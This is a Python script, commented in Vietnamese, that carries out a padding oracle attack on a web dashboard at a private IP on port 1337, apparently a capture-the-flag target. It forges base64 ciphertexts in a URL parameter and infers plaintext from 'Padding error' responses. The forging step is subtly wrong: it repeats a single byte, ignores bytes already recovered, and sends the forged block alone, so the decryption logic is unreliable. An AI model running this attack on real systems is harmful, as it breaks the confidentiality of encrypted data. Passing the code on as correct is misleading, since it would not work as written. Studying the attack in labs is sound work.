import base64
import requests

# URL mục tiêu
target_url = "http://10.10.25.26:1337/dashboard.php?date="

# Ciphertext hợp lệ để bắt đầu tấn công
valid_ciphertext = "6y1S9sVuEOYf3z3MzZBIfqcL4ZxZRziml8VTjLwPshM="

# Hàm gửi request và kiểm tra lỗi Padding
def check_padding(ciphertext):
    url = target_url + ciphertext
    response = requests.get(url)
    
    # Kiểm tra phản hồi có lỗi padding hay không
    if "Padding error" in response.text:
        return False
    else:
        return True

# Hàm để giải mã block của dữ liệu bằng Padding Oracle
def decrypt_block(ciphertext_block):
    block_size = 8  # Kích thước block là 8 byte (64-bit)
    decrypted_block = [0] * block_size  # Chứa kết quả giải mã

    for byte_index in range(1, block_size + 1):
        padding_value = byte_index

        for possible_byte in range(256):
            # Chuẩn bị block giả mạo
            prefix = bytearray([0] * (block_size - byte_index))
            modified_block = prefix + bytearray([possible_byte ^ padding_value ^ ciphertext_block[-byte_index] for _ in range(byte_index)])

            # Encode base64
            modified_ciphertext = base64.b64encode(modified_block).decode()

            # Gửi request và kiểm tra lỗi padding
            if check_padding(modified_ciphertext):
                decrypted_block[-byte_index] = possible_byte ^ padding_value
                break

    return decrypted_block

# Hàm tấn công vào toàn bộ ciphertext
def decrypt_ciphertext(ciphertext):
    decoded_ciphertext = base64.b64decode(ciphertext)
    block_size = 8

    # Chia ciphertext thành các block
    blocks = [decoded_ciphertext[i:i + block_size] for i in range(0, len(decoded_ciphertext), block_size)]

    decrypted_text = bytearray()

    # Giải mã từng block (ngoại trừ block cuối cùng)
    for i in range(1, len(blocks)):
        decrypted_block = decrypt_block(blocks[i])
        decrypted_text.extend(decrypted_block)

    return decrypted_text.decode()

# Giải mã ciphertext hợp lệ
decrypted_message = decrypt_ciphertext(valid_ciphertext)
print(f"Decrypted message: {decrypted_message}")
